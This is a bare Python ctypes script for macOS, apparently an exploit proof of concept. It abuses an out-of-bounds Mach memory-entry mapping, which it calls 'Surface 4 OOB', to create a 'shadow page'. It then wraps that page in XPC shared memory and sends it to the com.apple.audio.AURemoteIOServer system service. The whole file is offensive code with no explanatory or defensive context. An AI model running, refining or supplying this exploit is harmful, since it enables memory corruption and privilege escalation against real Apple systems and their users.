import ctypes as C

L = C.CDLL('/usr/lib/libSystem.B.dylib')
X = C.CDLL('/usr/lib/system/libxpc.dylib')
L.mach_task_self.restype = C.c_uint32
t = L.mach_task_self()

# Step 1: Shadow page via Surface 4 OOB
M = L.mach_make_memory_entry_64
M.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
V = L.mach_vm_map
V.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
L.mach_vm_allocate.argtypes = [C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int]

a = C.c_uint64(0); L.mach_vm_allocate(t,C.byref(a),0x4000,1)
p = C.c_uint32(0); ps = C.c_uint64(0x4000)
M(t,C.byref(ps),a.value,3,C.byref(p),0)
c = C.c_uint32(0); cs = C.c_uint64(0x1001)
M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
m = C.c_uint64(0); V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)
q = (C.c_uint8*0x4000).from_address(m.value)
q[0x3000] = 0xAB
ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
M(t,C.byref(ns),m.value+0x3000,3,C.byref(ne),0)
m4 = C.c_uint64(0); V(t,C.byref(m4),0x4000,0,1,ne.value,0,0,3,3,0)
shadow_va = m4.value
print(f"shadow VA: {hex(shadow_va)} ne={ne.value}")

# Step 2: Wrap shadow page in xpc_shmem
X.xpc_shmem_create.restype = C.c_void_p
X.xpc_shmem_create.argtypes = [C.c_void_p, C.c_uint64]
shmem = X.xpc_shmem_create(shadow_va, 0x1000)
print(f"xpc_shmem: {hex(shmem or 0)}")

# Step 3: Connect to AURemoteIOServer
X.xpc_connection_create_mach_service.restype = C.c_void_p
X.xpc_connection_create_mach_service.argtypes = [C.c_char_p, C.c_void_p, C.c_uint64]
X.xpc_connection_resume.restype = None
X.xpc_connection_resume.argtypes = [C.c_void_p]
conn = X.xpc_connection_create_mach_service(b"com.apple.audio.AURemoteIOServer", None, 0)
X.xpc_connection_resume(conn)
print(f"conn: {hex(conn or 0)}")

# Step 4: Send minimal dict with our shmem and observe reply
X.xpc_dictionary_create.restype = C.c_void_p
X.xpc_dictionary_create.argtypes = [C.c_void_p, C.c_void_p, C.c_uint64]
X.xpc_dictionary_set_value.restype = None
X.xpc_dictionary_set_value.argtypes = [C.c_void_p, C.c_char_p, C.c_void_p]
X.xpc_connection_send_message_with_reply_sync.restype = C.c_void_p
X.xpc_connection_send_message_with_reply_sync.argtypes = [C.c_void_p, C.c_void_p]
X.xpc_copy_description.restype = C.c_char_p
X.xpc_copy_description.argtypes = [C.c_void_p]

msg = X.xpc_dictionary_create(None, None, 0)
if shmem:
    X.xpc_dictionary_set_value(msg, b"sharedMemory", shmem)
reply = X.xpc_connection_send_message_with_reply_sync(conn, msg)
print(f"reply: {hex(reply or 0)}")
if reply:
    desc = X.xpc_copy_description(reply)
    print(f"reply desc: {desc[:500] if desc else 'none'}")
